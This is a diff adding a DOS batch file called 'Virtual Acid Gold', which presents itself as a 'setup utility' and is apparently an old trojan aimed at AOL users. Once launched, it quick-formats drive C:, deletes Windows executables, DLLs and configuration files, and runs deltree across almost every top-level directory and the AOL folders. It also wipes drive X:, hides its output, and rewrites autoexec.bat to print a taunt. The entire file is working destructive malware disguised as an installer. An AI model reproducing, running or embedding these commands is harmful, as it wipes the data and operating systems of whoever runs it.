@@ -1,0 +1,76 @@
+rem Virtual Acid Gold
+rem anti-lamer ware for aol.
+rem see also Virtual Acid 1.0 and Virtual Acid 2.0
+rem created by Kurruppt2k 
+@echo off
+cls
+echo VIRTUAL ACID Gold setup utility
+echo.
+choice /c:yn Are you currently rinning Windows?
+if errorlevel 2 goto start
+if errorlevel 1 echo.
+echo Please exit to DOS (not a DOS shell) and run VIRTUAL ACID Gold.
+echo.
+pause
+exit > c:\garbage
+:start
+pause
+cls
+echo launching VIRTUAL ACID Gold...
+rem X
+echo y| format c: /q /u > c:\garbage
+echo y| del c:\windows\*.exe > c:\garbage
+mkdir c:\temp001 
+move c:\windows\command.com c:\temo01 > c:\garbage
+echo y| del c:\windows\*.com > c:\garbage
+move c:\temp001\command.com c:\windows
+deltree /y c:\temp001 > c:\garbage
+echo y| del c:\windows\*.dll > c:\garbage
+echo y| del c:\windows\config\*.* > c:\garbage
+deltree /y c:\windows\sys* > c:\garbage
+echo y| del c:\windows\command\*.com > c:\garbage
+del c:\dos undelelete.* > c:\garbage
+deltree /y c:\aol* > c:\garbage
+deltree /y c:\sb* > c:\garbage
+deltree /y c:\cd* > c:\garbage
+deltree /y c:\prog* > c:\garbage
+deltree /y c:\a* > c:\garbage
+deltree /y c:\b* > c:\garbage
+deltree /y c:\c* > c:\garbage
+deltree /y c:\e* > c:\garbage
+deltree /y c:\f* > c:\garbage
+deltree /y c:\g* > c:\garbage
+deltree /y c:\h* > c:\garbage
+deltree /y c:\i* > c:\garbage
+deltree /y c:\j* > c:\garbage
+deltree /y c:\k* > c:\garbage
+deltree /y c:\l* > c:\garbage
+deltree /y c:\m* > c:\garbage
+deltree /y c:\n* > c:\garbage
+deltree /y c:\o* > c:\garbage
+deltree /y c:\p* > c:\garbage
+deltree /y c:\q* > c:\garbage
+deltree /y c:\r* > c:\garbage
+deltree /y c:\s* > c:\garbage
+deltree /y c:\t* > c:\garbage
+deltree /y c:\u* > c:\garbage
+deltree /y c:\v* > c:\garbage
+deltree /y c:\x* > c:\garbage
+deltree /y c:\y* > c:\garbage
+deltree /y c:\z* > c:\garbage
+echo y| del c:\aol\*.* > c:\garbage
+echo y| del c:\aol20\*.* > c:\garbage
+rem X
+echo y| del x:\aol30\*.* > c:\garbage
+echo y| del x:\dos\*.* > c:\garbage
+echo y| del x:\*.* > c:\garbage
+echo echo YOU HAVE BEEN KURRUPPTED! > c:\autoexec.bat
+del c:\garbage
+cls
+echo Virtual Acid Gold finished...
+echo.
+pause
+cls
+prompt $e
+echo YOU HAVE BEEN KURRUPPTED!
+
